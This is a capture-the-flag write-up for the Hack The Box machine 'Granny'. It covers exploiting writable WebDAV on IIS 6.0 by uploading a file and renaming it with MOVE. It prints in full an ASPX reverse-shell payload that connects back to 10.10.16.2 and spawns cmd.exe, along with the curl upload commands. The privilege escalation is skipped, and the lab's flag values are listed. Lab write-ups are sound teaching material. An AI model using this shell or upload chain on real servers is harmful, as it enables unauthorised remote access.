---
title: "HTB: Granny [Easy]"
date: 2025-10-06 00:00 +0800
categories: [HTB]
tags: [HTB,Easy,Churrasco,SMB]
image: https://github.com/user-attachments/assets/7f4e4917-c848-4013-8641-ee9274a5bfe0
---

<img width="872" height="352" alt="image" src="https://github.com/user-attachments/assets/7f4e4917-c848-4013-8641-ee9274a5bfe0" />

## Recon
nmap scan result
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ cat nmap/.nmap 
# Nmap 7.95 scan initiated Tue Dec 23 10:59:30 2025 as: /usr/lib/nmap/nmap --privileged -sCV -vvv -p- -T4 -oA nmap/ granny.htb
Nmap scan report for granny.htb (10.10.10.15)
Host is up, received echo-reply ttl 127 (0.016s latency).
Scanned at 2025-12-23 10:59:30 +08 for 100s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Tue, 23 Dec 2025 02:31:10 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 23 11:01:10 2025 -- 1 IP address (1 host up) scanned in 99.88 seconds
```

This Nmap scan shows that it's Windows machine running **Microsoft IIS 6.0** on port 80, with **WebDAV** enabled and many risky HTTP methods allowed.

By default we run davtest because **WebDAV** often allows file upload, and davtest quickly checks whether we can upload, execute, or interact with files on the server, which is a common and easy path to initial access. So here's the scan result.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ davtest -url http://granny.htb
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://granny.htb
********************************************************
NOTE    Random string for this session: Wud4lugMKxbP4N3
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://granny.htb/DavTestDir_Wud4lugMKxbP4N3
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.txt
PUT     pl      SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.pl
PUT     cgi     FAIL
PUT     jsp     SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.jsp
PUT     php     SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.php
PUT     jhtml   SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.jhtml
PUT     shtml   FAIL
PUT     asp     FAIL
PUT     cfm     SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.cfm
PUT     html    SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.html
PUT     aspx    FAIL
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    jhtml   FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.txt
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.pl
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.jsp
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.php
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.jhtml
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.cfm
PUT File: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.html
Executes: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.txt
Executes: http://granny.htb/DavTestDir_Wud4lugMKxbP4N3/davtest_Wud4lugMKxbP4N3.html
```

The davtest result confirms that WebDAV is **writable**, allowing us to **create directories** and **upload multiple file types**, but **only static files** like `.txt` and `.html` are executable, indicating that while full RCE via script execution isn’t directly possible. so we upload a payload as a harmless file `.txt` and then use **MOVE** or **COPY** to rename it to a dangerous extension `.aspx`, bypassing the filter.

Next, we try to verify whether this bypass is possible by first creating a `.txt` file and checking if it remains accessible. To do this, we can use **curl** to upload and manipulate files via WebDAV, and **cadaver** to interactively test PUT, MOVE, and COPY operations.

Here's if we are using **curl**:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ echo "hello!" > hello.txt

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl -X PUT http://granny.htb/hello.txt -d @hello.txt 

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl http://granny.htb/hello.txt
hello!
```
If we want to use **cadavar**, this is how it would be:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ cadaver http://granny.htb
dav:/> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       rename     lock       unlock     discover   steal      showlocks  
 version    checkin    checkout   uncheckout history    label      propnames  
 chexec     propget    propdel    propset    search     set        open       
 close      echo       quit       unset      lcd        lls        lpwd       
 logout     help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/> put hello.txt 
Uploading hello.txt to `/hello.txt':
Progress: [=============================>] 100.0% of 7 bytes succeeded.
dav:/> cat hello.txt 
hello!
dav:/> 
```

As **WebDAV** result, we should be able to upload static files and we proved it. But how about payload? We would be using this `.aspx` **[revshell payload](https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx)** for us. 

Also `-d` treats the data as form content and may alter it (such as stripping newlines or changing encoding), while `--data-binary` uploads the file exactly as-is, preserving every byte, which is why it’s required when uploading payloads.
```

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl -X PUT http://granny.htb/revshell.txt -d @revshell.aspx

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl http://granny.htb/revshell.txt
<%@ Page Language="C#" %><%@ Import Namespace="System.Runtime.InteropServices" %><%@ Import Namespace="System.Net" %><%@ Import Namespace="System.Net.Sockets" %><%@ Import Namespace="System.Security.Principal" %><%@ Import Namespace="System.Data.SqlClient" %><script runat="server">//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell///Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip          protected void Page_Load(object sender, EventArgs e)    {           String host = "10.10.16.2"; //CHANGE THIS            int port = 4455; ////CHANGE THIS                        CallbackShell(host, port);    }    [StructLayout(LayoutKind.Sequential)]    public struct STARTUPINFO    {        public int cb;        public String lpReserved;        public String lpDesktop;        public String lpTitle;        public uint dwX;        public uint dwY;        public uint dwXSize;        public uint dwYSize;        public uint dwXCountChars;        public uint dwYCountChars;        public uint dwFillAttribute;        public uint dwFlags;        public short wShowWindow;        public short cbReserved2;        public IntPtr lpReserved2;        public IntPtr hStdInput;        public IntPtr hStdOutput;        public IntPtr hStdError;    }    [StructLayout(LayoutKind.Sequential)]    public struct PROCESS_INFORMATION    {        public IntPtr hProcess;        public IntPtr hThread;        public uint dwProcessId;        public uint dwThreadId;    }    [StructLayout(LayoutKind.Sequential)]    public struct SECURITY_ATTRIBUTES    {        public int Length;        public IntPtr lpSecurityDescriptor;        public bool bInheritHandle;    }            [DllImport("kernel32.dll")]    static extern bool CreateProcess(string lpApplicationName,       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,       [In] ref STARTUPINFO lpStartupInfo,       out PROCESS_INFORMATION lpProcessInformation);    public static uint INFINITE = 0xFFFFFFFF;        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);    internal struct sockaddr_in    {        public short sin_family;        public short sin_port;        public int sin_addr;        public long sin_zero;    }    [DllImport("kernel32.dll")]    static extern IntPtr GetStdHandle(int nStdHandle);    [DllImport("kernel32.dll")]    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);    public const int STD_INPUT_HANDLE = -10;    public const int STD_OUTPUT_HANDLE = -11;    public const int STD_ERROR_HANDLE = -12;        [DllImport("kernel32")]    static extern bool AllocConsole();    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,                                            [In] SocketType socketType,                                            [In] ProtocolType protocolType,                                            [In] IntPtr protocolInfo,                                             [In] uint group,                                            [In] int flags                                            );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]    internal static extern int inet_addr([In] string cp);    [DllImport("ws2_32.dll")]    private static extern string inet_ntoa(uint ip);    [DllImport("ws2_32.dll")]    private static extern uint htonl(uint ip);        [DllImport("ws2_32.dll")]    private static extern uint ntohl(uint ip);        [DllImport("ws2_32.dll")]    private static extern ushort htons(ushort ip);        [DllImport("ws2_32.dll")]    private static extern ushort ntohs(ushort ip);          [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern int send(                                [In] IntPtr socketHandle,                                [In] byte[] pinnedBuffer,                                [In] int len,                                [In] SocketFlags socketFlags                                );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern int recv(                                [In] IntPtr socketHandle,                                [In] IntPtr pinnedBuffer,                                [In] int len,                                [In] SocketFlags socketFlags                                );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern int closesocket(                                       [In] IntPtr socketHandle                                       );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern IntPtr accept(                                  [In] IntPtr socketHandle,                                  [In, Out] ref sockaddr_in socketAddress,                                  [In, Out] ref int socketAddressSize                                  );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern int listen(                                  [In] IntPtr socketHandle,                                  [In] int backlog                                  );    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]   internal static extern int bind(                                [In] IntPtr socketHandle,                                [In] ref sockaddr_in  socketAddress,                                [In] int socketAddressSize                                );   public enum TOKEN_INFORMATION_CLASS   {       TokenUser = 1,       TokenGroups,       TokenPrivileges,       TokenOwner,       TokenPrimaryGroup,       TokenDefaultDacl,       TokenSource,       TokenType,       TokenImpersonationLevel,       TokenStatistics,       TokenRestrictedSids,       TokenSessionId   }   [DllImport("advapi32", CharSet = CharSet.Auto)]   public static extern bool GetTokenInformation(       IntPtr hToken,       TOKEN_INFORMATION_CLASS tokenInfoClass,       IntPtr TokenInformation,       int tokeInfoLength,       ref int reqLength);   public enum TOKEN_TYPE   {       TokenPrimary = 1,       TokenImpersonation   }   public enum SECURITY_IMPERSONATION_LEVEL   {       SecurityAnonymous,       SecurityIdentification,       SecurityImpersonation,       SecurityDelegation   }      [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,       ref IntPtr DuplicateTokenHandle);      const int ERROR_NO_MORE_ITEMS = 259;   [StructLayout(LayoutKind.Sequential)]   struct TOKEN_USER   {       public _SID_AND_ATTRIBUTES User;   }   [StructLayout(LayoutKind.Sequential)]   public struct _SID_AND_ATTRIBUTES   {       public IntPtr Sid;       public int Attributes;   }   [DllImport("advapi32", CharSet = CharSet.Auto)]   public extern static bool LookupAccountSid   (       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,       IntPtr pSid,       StringBuilder Account,       ref int cbName,       StringBuilder DomainName,       ref int cbDomainName,       ref int peUse    );   [DllImport("advapi32", CharSet = CharSet.Auto)]   public extern static bool ConvertSidToStringSid(       IntPtr pSID,       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);   [DllImport("kernel32.dll", SetLastError = true)]   public static extern bool CloseHandle(       IntPtr hHandle);   [DllImport("kernel32.dll", SetLastError = true)]   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);   [Flags]   public enum ProcessAccessFlags : uint   {       All = 0x001F0FFF,       Terminate = 0x00000001,       CreateThread = 0x00000002,       VMOperation = 0x00000008,       VMRead = 0x00000010,       VMWrite = 0x00000020,       DupHandle = 0x00000040,       SetInformation = 0x00000200,       QueryInformation = 0x00000400,       Synchronize = 0x00100000   }   [DllImport("kernel32.dll")]   static extern IntPtr GetCurrentProcess();   [DllImport("kernel32.dll")]   extern static IntPtr GetCurrentThread();   [DllImport("kernel32.dll", SetLastError = true)]   [return: MarshalAs(UnmanagedType.Bool)]   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);    [DllImport("psapi.dll", SetLastError = true)]    public static extern bool EnumProcessModules(IntPtr hProcess,    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,    uint cb,    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);    [DllImport("psapi.dll")]    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;    public const uint PIPE_ACCESS_INBOUND = 0x00000001;    public const uint PIPE_WAIT = 0x00000000;    public const uint PIPE_NOWAIT = 0x00000001;    public const uint PIPE_READMODE_BYTE = 0x00000000;    public const uint PIPE_READMODE_MESSAGE = 0x00000002;    public const uint PIPE_TYPE_BYTE = 0x00000000;    public const uint PIPE_TYPE_MESSAGE = 0x00000004;    public const uint PIPE_CLIENT_END = 0x00000000;    public const uint PIPE_SERVER_END = 0x00000001;    public const uint PIPE_UNLIMITED_INSTANCES = 255;    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;    public const uint NMPWAIT_NOWAIT = 0x00000001;    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;    public const uint GENERIC_READ = (0x80000000);    public const uint GENERIC_WRITE = (0x40000000);    public const uint GENERIC_EXECUTE = (0x20000000);    public const uint GENERIC_ALL = (0x10000000);    public const uint CREATE_NEW = 1;    public const uint CREATE_ALWAYS = 2;    public const uint OPEN_EXISTING = 3;    public const uint OPEN_ALWAYS = 4;    public const uint TRUNCATE_EXISTING = 5;    public const int INVALID_HANDLE_VALUE = -1;    public const ulong ERROR_SUCCESS = 0;    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;    public const ulong ERROR_PIPE_BUSY = 231;    public const ulong ERROR_NO_DATA = 232;    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;    public const ulong ERROR_MORE_DATA = 234;    public const ulong ERROR_PIPE_CONNECTED = 535;    public const ulong ERROR_PIPE_LISTENING = 536;    [DllImport("kernel32.dll", SetLastError = true)]    public static extern IntPtr CreateNamedPipe(        String lpName,                                      uint dwOpenMode,                                                                 uint dwPipeMode,                 uint nMaxInstances,                                                              uint nOutBufferSize,             uint nInBufferSize,                                                              uint nDefaultTimeOut,            IntPtr pipeSecurityDescriptor        );    [DllImport("kernel32.dll", SetLastError = true)]    public static extern bool ConnectNamedPipe(        IntPtr hHandle,        uint lpOverlapped        );    [DllImport("Advapi32.dll", SetLastError = true)]    public static extern bool ImpersonateNamedPipeClient(        IntPtr hHandle);    [DllImport("kernel32.dll", SetLastError = true)]    public static extern bool GetNamedPipeHandleState(        IntPtr hHandle,        IntPtr lpState,        IntPtr lpCurInstances,        IntPtr lpMaxCollectionCount,        IntPtr lpCollectDataTimeout,        StringBuilder lpUserName,        int nMaxUserNameSize        );     protected void CallbackShell(string server, int port)    {        string request = "Spawn Shell...\n";        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);        IntPtr oursocket = IntPtr.Zero;                sockaddr_in socketinfo;        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);        socketinfo = new sockaddr_in();        socketinfo.sin_family = (short) AddressFamily.InterNetwork;        socketinfo.sin_addr = inet_addr(server);        socketinfo.sin_port = (short) htons((ushort)port);        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));        send(oursocket, bytesSent, request.Length, 0);        SpawnProcessAsPriv(oursocket);        closesocket(oursocket);    }    protected void SpawnProcess(IntPtr oursocket)    {        bool retValue;        string Application = Environment.GetEnvironmentVariable("comspec");         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();        STARTUPINFO sInfo = new STARTUPINFO();        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();        pSec.Length = Marshal.SizeOf(pSec);        sInfo.dwFlags = 0x00000101;        sInfo.hStdInput = oursocket;        sInfo.hStdOutput = oursocket;        sInfo.hStdError = oursocket;        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);    }    protected void SpawnProcessAsPriv(IntPtr oursocket)    {        bool retValue;        string Application = Environment.GetEnvironmentVariable("comspec");         PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();        STARTUPINFO sInfo = new STARTUPINFO();        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();        pSec.Length = Marshal.SizeOf(pSec);        sInfo.dwFlags = 0x00000101;         IntPtr DupeToken = new IntPtr(0);        sInfo.hStdInput = oursocket;        sInfo.hStdOutput = oursocket;        sInfo.hStdError = oursocket;        if (DupeToken == IntPtr.Zero)            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);        else            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);        CloseHandle(DupeToken);    }    </script>

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl -X PUT http://granny.htb/revshell.txt --data-binary @revshell.aspx

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl http://granny.htb/revshell.txt
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
...
</script>
```
Use **MOVE/COPY** as planned to change the file extension so we can properly execute this payload.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl -X PUT http://granny.htb/revshell.txt --data-binary @revshell.aspx 

┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl -X MOVE -H 'Destination: http://granny.htb/revshell.aspx' http://granny.htb/revshell.txt
```

Setup listener by using **penelope**.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ penelope -p 4455
[+] Listening for reverse shells on 0.0.0.0:4455 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
Interact with the payload
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ curl http://granny.htb/revshell.aspx
```
## Shell as network service
Here's our rev connection successful and we get shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Granny]
└─$ penelope -p 4455
[+] Listening for reverse shells on 0.0.0.0:4455 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from GRANNY~10.10.10.15-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/GRANNY~10.10.10.15-Microsoft(R)_Windows(R)_Server_2003,_Standard_Edition-X86-based_PC/2025_12_24-12_08_17-755.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```
## Discovery with network service

During discovery we were able to find multiple users but there's unique users such as Administrator and Lakis. Both are  
<img width="687" height="345" alt="image" src="https://github.com/user-attachments/assets/43515d7c-64e5-410e-9ee1-0e5a4628f06e" />

## Shell as system

### User flag
```
C:\DOCUME~1\Lakis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\DOCUME~1\Lakis\Desktop

04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  09:20 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,312,399,360 bytes free

C:\DOCUME~1\Lakis\Desktop>type user.txt
type user.txt
700c5dc163014e22b3e408f8703f67d1
```
### Root flag
```
C:\DOCUME~1\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\DOCUME~1\Administrator\Desktop

04/12/2017  04:28 PM    <DIR>          .
04/12/2017  04:28 PM    <DIR>          ..
04/12/2017  09:17 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,312,395,264 bytes free

C:\DOCUME~1\Administrator\Desktop>type root.txt
type root.txt
aa4beed1c0584445ab463a6747bd06e9
```
